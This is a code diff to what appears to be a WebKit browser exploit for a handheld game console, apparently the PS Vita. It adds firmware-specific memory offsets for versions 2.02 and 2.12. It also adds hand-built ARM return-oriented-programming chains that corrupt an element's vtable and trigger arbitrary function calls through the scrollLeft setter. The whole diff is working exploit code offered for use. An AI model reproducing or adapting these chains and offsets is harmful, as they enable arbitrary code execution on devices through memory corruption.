@@ -8,6 +8,28 @@
 function defineOffsets()
 {
 	ver_offsets = {
+		v2_02:{
+				scewkbase_off : 0x3739f3,
+				scelibcentry_off: 0x68e27c, 
+				scelibnetentry_off: 0x68e248,
+				scekernentry_off: 0x68e258,
+				scekernbase_off: 0x93dd,
+				scelibcbase_off: 0xc9ad,
+				scelibnetbase_off: 0x2aed,
+				elementvtable_off: -0x68,
+				setscrollleft_off: 0x5b
+			},
+		v2_12:{
+				scewkbase_off : 0x3cbb5d,
+				scelibcentry_off: 0x6bd6ec, 
+				scelibnetentry_off: 0x6bd6b8,
+				scekernentry_off: 0x6bd6c8,
+				scekernbase_off: 0xa085,
+				scelibcbase_off: 0xfafd,
+				scelibnetbase_off: 0x2515,
+				elementvtable_off: -0x68,
+				setscrollleft_off: 0x5b
+			},
 		v3_00:{
 				scewkbase_off : 0x3d73a9,
 				scelibcentry_off: 0x6c4718, 
@@ -125,7 +147,132 @@ function get_caller(tmpmem, element, vtidx, fkvtable, version)
 			
 			var retval = allocate_tmp(0x4);
 
-			if ((version == "v3_00") || (version == "v3_01"))
+			if (version == "v2_02")
+			{
+				// ROP chain for FW 2.02
+				var r0values = allocate_tmp(0x10 * 4);
+				var r2values = allocate_tmp(0x10 * 4);
+				var r2values_4 = allocate_tmp(0x10 * 4);
+				var r4values = allocate_tmp(0x10 * 4);
+				var r4values_2 = allocate_tmp(0x10 * 4);
+				
+				mymemset(retval, 0, 4);	
+				
+				aspace32[(r0values / 4)] = r2values;                            // r2
+				aspace32[((r0values + 4) / 4)] = r4values_2;                    // r4
+				aspace32[((r0values + 8) / 4)] = 0x0;                           // r5
+				aspace32[((r0values + 12) / 4)] = 0x0;		                    // r8
+				aspace32[((r0values + 16) / 4)] = 0x0;                          // fp
+				aspace32[((r0values + 20) / 4)] = 0x0;                          // ip
+				aspace32[((r0values + 24) / 4)] = scewkggts.ldmr2;              // pc
+				
+				aspace32[(r2values / 4)] = r0;		                            // r0
+				aspace32[((r2values + 4) / 4)] = r1;                           	// r1
+				aspace32[((r2values + 8) / 4)] = r2;                           	// r2
+				aspace32[((r2values + 12) / 4)] = r3;		                    // r3
+				aspace32[((r2values + 16) / 4)] = 0x0;                          // ip
+				aspace32[((r2values + 20) / 4)] = scewkggts.ldmr4_2;            // lr
+				aspace32[((r2values + 24) / 4)] = fcn;              			// pc
+				
+				aspace32[(r4values_2 / 4)] = r2values_4;                     	// r2
+				aspace32[((r4values_2 + 4) / 4)] = 0x0;                   		// ip
+				aspace32[((r4values_2 + 8) / 4)] = scewkggts.ldmr2_4;       	// lr
+				aspace32[((r4values_2 + 12) / 4)] = scewkggts.movr30;      		// pc
+				
+				aspace32[(r2values_4 / 4)] = retval - 4;                     	// r0
+				aspace32[((r2values_4 + 4) / 4)] = 0x0; 	                    // r1
+				aspace32[((r2values_4 + 8) / 4)] = r4values;                  	// r4
+				aspace32[((r2values_4 + 12) / 4)] = 0x0;                   		// ip
+				aspace32[((r2values_4 + 16) / 4)] = scewkggts.ldmr4;       		// lr
+				aspace32[((r2values_4 + 20) / 4)] = scewkggts.str3;      		// pc
+				
+				aspace32[(r4values / 4)] = scontext;                     		// r0
+				aspace32[((r4values + 4) / 4)] = 0x0;       		      		// r1
+				aspace32[((r4values + 8) / 4)] = 0x0;                   		// ip
+				aspace32[((r4values + 12) / 4)] = 0x0; 					 		// lr
+				aspace32[((r4values + 16) / 4)] = scelibcggts.scelongjmp;       // pc
+				
+				var ropchain = [r0values, 0x41414141, 0x41414141, scewkggts.ldmr0];
+				var rchainaddr = allocate_tmp(ropchain.length * 4);
+				
+				// Copy ROPchain
+				for (var i = 0; i < ropchain.length; i++) {
+					aspace32[(rchainaddr + (i << 2)) / 4] = ropchain[i];
+				}
+
+				// Trigger ROPchain
+				aspace32[(fkvtable + (0x5b << 2)) / 4] = scewkggts.ldmr1; 
+				element.scrollLeft = rchainaddr;
+			}
+			else if (version == "v2_12")
+			{
+				// ROP chain for FW 2.12
+				var r2values = allocate_tmp(0x10 * 4);
+				var r8values = allocate_tmp(0x10 * 4);
+				var r4values = allocate_tmp(0x10 * 4);
+				var r4values_8 = allocate_tmp(0x10 * 4);
+				var r4values_1 = allocate_tmp(0x10 * 4);
+				var r1values_0 = allocate_tmp(0x10 * 4);
+				
+				mymemset(retval, 0, 4);
+
+				aspace32[(r2values / 4)] = 0x0;                                	// r0
+				aspace32[((r2values + 4) / 4)] = 0x0;                          	// r1
+				aspace32[((r2values + 8) / 4)] = 0x0;                     		// r2
+				aspace32[((r2values + 12) / 4)] = r3;                    		// r3
+				aspace32[((r2values + 16) / 4)] = 0x0;                         	// ip
+				aspace32[((r2values + 20) / 4)] = 0x0;                         	// lr
+				aspace32[((r2values + 24) / 4)] = scewkggts.ldmr4_8;            // pc
+				
+				aspace32[(r4values_8 / 4)] = 0x0;                               // r0
+				aspace32[((r4values_8 + 4) / 4)] = 0x0;                         // r1
+				aspace32[((r4values_8 + 8) / 4)] = r8values;                    // r8
+				aspace32[((r4values_8 + 12) / 4)] = 0x0;                        // ip
+				aspace32[((r4values_8 + 16) / 4)] = 0x0;                        // lr
+				aspace32[((r4values_8 + 20) / 4)] = scewkggts.ldmr8;            // pc
+
+				aspace32[(r8values / 4)] = r0;                                  // r0
+				aspace32[((r8values + 4) / 4)] = r1;                            // r1
+				aspace32[((r8values + 8) / 4)] = r2;                            // r2
+				aspace32[((r8values + 12) / 4)] = r4values_1;                   // r4
+				aspace32[((r8values + 16) / 4)] = 0x0; 		                    // r5
+				aspace32[((r8values + 20) / 4)] = 0x0;                          // ip
+				aspace32[((r8values + 24) / 4)] = scewkggts.ldmr4_1;            // lr
+				aspace32[((r8values + 28) / 4)] = fcn;                          // pc (actual function)
+
+				aspace32[(r4values_1 / 4)] = r1values_0;                        // r1
+				aspace32[((r4values_1 + 4) / 4)] = 0x0;                         // ip
+				aspace32[((r4values_1 + 8) / 4)] = scewkggts.ldmr1_0;           // lr
+				aspace32[((r4values_1 + 12) / 4)] = scewkggts.movr30;           // pc
+
+				aspace32[(r1values_0 / 4)] = retval - 4;                        // r0
+				aspace32[((r1values_0 + 4) / 4)] = 0x0;                         // r1
+				aspace32[((r1values_0 + 8) / 4)] = 0x0;                         // r2
+				aspace32[((r1values_0 + 12) / 4)] = r4values;                   // r4
+				aspace32[((r1values_0 + 16) / 4)] = 0x0;                   		// ip
+				aspace32[((r1values_0 + 20) / 4)] = scewkggts.ldmr4;            // lr
+				aspace32[((r1values_0 + 24) / 4)] = scewkggts.str3;             // pc
+
+				aspace32[(r4values / 4)] = scontext;                            // r0
+				aspace32[((r4values + 4) / 4)] = 0x0;                           // r1
+				aspace32[((r4values + 8) / 4)] = 0x0;                           // r2
+				aspace32[((r4values + 12) / 4)] = 0x0;                          // ip
+				aspace32[((r4values + 16) / 4)] = 0x0;                          // lr
+				aspace32[((r4values + 20) / 4)] = scelibcggts.scelongjmp;       // pc
+				
+				var ropchain = [0x0, 0x0, r2values, r4values_8, 0x41414141, 0x41414141, scewkggts.ldmr2];
+				var rchainaddr = allocate_tmp(ropchain.length * 4);
+				
+				// Copy ROPchain
+				for (var i = 0; i < ropchain.length; i++) {
+					aspace32[(rchainaddr + (i << 2)) / 4] = ropchain[i];
+				}
+
+				// Trigger ROPchain
+				aspace32[(fkvtable + (0x5b << 2)) / 4] = scewkggts.ldmr1; 
+				element.scrollLeft = rchainaddr;
+			}
+			else if ((version == "v3_00") || (version == "v3_01"))
 			{
 				// ROP chain for FWs 3.00 and 3.01
 				var r0values = allocate_tmp(0x10 * 4);
